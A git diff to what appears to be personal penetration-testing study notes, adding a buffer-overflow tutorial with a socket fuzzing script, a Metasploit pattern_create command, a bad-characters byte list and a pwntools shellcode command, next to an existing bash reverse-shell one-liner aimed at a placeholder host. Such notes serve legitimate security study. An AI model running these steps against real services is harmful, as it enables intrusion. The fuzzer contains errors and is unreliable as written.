@@ -364,7 +364,107 @@ If website is launching perl reverse shell, we can modify it to get better shell
 > $ bash -c 'bash -i &> /dev/tcp/<HOST_IP>/9001 0>&1'
 ```
 
-### BufferOverflow
+### Buffer Overflows
+
+Memory Space for a Running Process:
+
+![image](https://user-images.githubusercontent.com/44027114/136861123-4f0359ab-456b-44d0-98f7-02be1b0a0e76.png)
+
+
+
+Little Endian vs Big Endian (the way that the CPU reads shell code)
+
+
+Buffers
+![image](https://user-images.githubusercontent.com/44027114/136861010-b58309f7-4944-4495-b24c-67310eb4dd42.png)
+
+
+![image](https://user-images.githubusercontent.com/44027114/136860992-e8328e06-d684-4c78-8188-d8d4f6812c05.png)
+
+
+Fuzzing!!!
+
+Pass differing amounts/types of data into a function in order to attempt to overwrite the EIP.
+
+Python Script to fuzz via probing (increasing data by n "A" byte each time)
+```python
+#!/usr/bin/python
+import time, struct, sys
+import socket as so
+
+
+# Create an array of buffers, from 1 to 1000 elements, with increments of 200 bytes each.
+buff=["A"]
+# max number of buffers in the array
+max_buffer = 1000
+# initial value of the counter
+counter=100
+# increment value
+increment=200
+
+while len(buff) <= max_buffer:
+    buff.append("A"*counter)
+    counter=counter+increment
+
+for string in buff:
+    try:
+        server = sys.argv[1]
+        port = sys.argv[2]
+    except IndexError:
+        print "[+] Usage %s host + port " % sys.argv[0]
+        sys.exit()
+
+    print "Fuzzing with %s bytes" % len(string)
+    s = so.socket(so.AF_INET, so.SOCK_STREAM)
+    try:
+        s.connect((server, port))
+        print s.recv(1024)
+        s.send( string+'\r\n')
+        s.send('exit\r\n')
+        print s.recv(1024)
+    except:
+        print "[!] connection refused, check debugger"
+        sys(exit)
+```
+
+Need to know the offset from the start of the buffer to the EIP in order to rewrite it.
+
+After finding a crashing buffer size, pass into pattern_create, it will highlight the EIP.
+```
+ > $ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
+```
+
+BACHARS: Bad Characters!
+
+To test for Bad Chars, want to test by adding the hex string into the payload and popping any missing elements from list.
+```python
+badchars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
+"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
+"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
+"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
+"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
+"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+
+buffer = "A"*1328 + "ABBA" + badchars
+```
+
+0x00 and 0x0A are always bad chars
+Bad chars vary from application/architecture, so need to find potential bad chars to exclude from payload. ( build the payload without using the bachars)
+
+
+Important Pointers to manipulate:
+
+There are a bunch of registers present in the memory amongst which we shall only be concerned about EIP, EBP, ESP.
+EBP: Stack pointer which points to the base of the stack.
+ESP: Stack pointer which points to the top of the stack.
+EIP: Contains the address of the next instruction to be executed.
+![image](https://user-images.githubusercontent.com/44027114/136861198-f3c8811a-08c5-4735-9e8c-d3757d4438d8.png)
+
+Using the EIP to set return to a custom address containing our custom shellcode.
+![image](https://user-images.githubusercontent.com/44027114/136861270-41a88516-20d7-4d41-84e0-b86bb6af8b54.png)
+
 To generate shellcode quickly, we can use python `pwn` library.
 ```
 > $ python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh))
